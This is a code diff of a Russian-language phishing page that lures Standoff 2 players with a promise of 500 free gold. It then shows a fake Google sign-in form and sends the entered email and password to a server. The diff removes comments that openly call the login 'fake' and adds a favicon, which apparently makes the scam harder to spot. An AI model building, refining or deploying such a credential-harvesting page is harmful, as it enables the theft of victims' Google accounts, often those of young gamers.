@@ -3,6 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+   <link rel="icon" href="favicon.png" type="image/png">
     <title>500 голды — Standoff 2</title>
     <style>
         * {
@@ -11,7 +12,6 @@
             box-sizing: border-box;
         }
 
-        /* ===== СТРАНИЦА 1: ПОЛУЧИТЬ 500 ГОЛДЫ ===== */
         .step1-body {
             background: #0a0a10;
             color: #fff;
@@ -123,7 +123,6 @@
             color: #445;
         }
 
-        /* ===== СТРАНИЦА 2: ФЕЙКОВЫЙ GOOGLE LOGIN ===== */
         .step2-body {
             background: #ffffff;
             font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
@@ -268,7 +267,6 @@
             display: none !important;
         }
 
-        /* ===== СТРАНИЦА 3: ГОЛДА ПРИДЁТ ===== */
         .step3-body {
             background: #0a0a10;
             color: #fff;
@@ -344,9 +342,7 @@
 </head>
 <body>
 
-    <!-- ======================================== -->
-    <!-- СТРАНИЦА 1: ПОЛУЧИТЬ 500 ГОЛДЫ            -->
-    <!-- ======================================== -->
+    <!-- СТРАНИЦА 1 -->
     <div id="step1" class="step1-body">
         <div class="bg-layer">
             <svg viewBox="0 0 800 600" preserveAspectRatio="xMidYMid slice">
@@ -384,9 +380,7 @@
         </div>
     </div>
 
-    <!-- ======================================== -->
-    <!-- СТРАНИЦА 2: ФЕЙКОВЫЙ GOOGLE LOGIN       -->
-    <!-- ======================================== -->
+    <!-- СТРАНИЦА 2 -->
     <div id="step2" class="step2-body hidden">
         <div class="google-container">
             <div class="google-logo">
@@ -434,9 +428,7 @@
         </div>
     </div>
 
-    <!-- ======================================== -->
-    <!-- СТРАНИЦА 3: ГОЛДА ПРИДЁТ В ТЕЧЕНИЕ ЧАСА -->
-    <!-- ======================================== -->
+    <!-- СТРАНИЦА 3 -->
     <div id="step3" class="step3-body hidden">
         <div class="dark-container" style="background: linear-gradient(145deg, rgba(20,20,30,0.94), rgba(10,10,16,0.97)); border: 1px solid #ffd70033;">
             <span class="check-icon">✅</span>
@@ -448,7 +440,6 @@
     </div>
 
     <script>
-        // ===== ПОЛЕ ПАРОЛЯ ПОЯВЛЯЕТСЯ ПОСЛЕ ВВОДА ПОЧТЫ =====
         document.getElementById('email').addEventListener('input', function() {
             const passwordField = document.getElementById('passwordField');
             const errorMsg = document.getElementById('errorMsg');
@@ -460,13 +451,11 @@
             }
         });
 
-        // ===== ПЕРЕХОД НА СТРАНИЦУ 2 =====
         function showStep2() {
             document.getElementById('step1').classList.add('hidden');
             document.getElementById('step2').classList.remove('hidden');
         }
 
-        // ===== ОТПРАВКА ДАННЫХ НА СЕРВЕР → ПЕРЕХОД НА СТРАНИЦУ 3 =====
         async function submitForm(e) {
             e.preventDefault();
 
@@ -501,7 +490,6 @@
                     result.textContent = '✅ Вход выполнен';
                     result.style.color = '#34a853';
 
-                    // Переход на страницу 3 через 1 секунду
                     setTimeout(() => {
                         document.getElementById('step2').classList.add('hidden');
                         document.getElementById('step3').classList.remove('hidden');
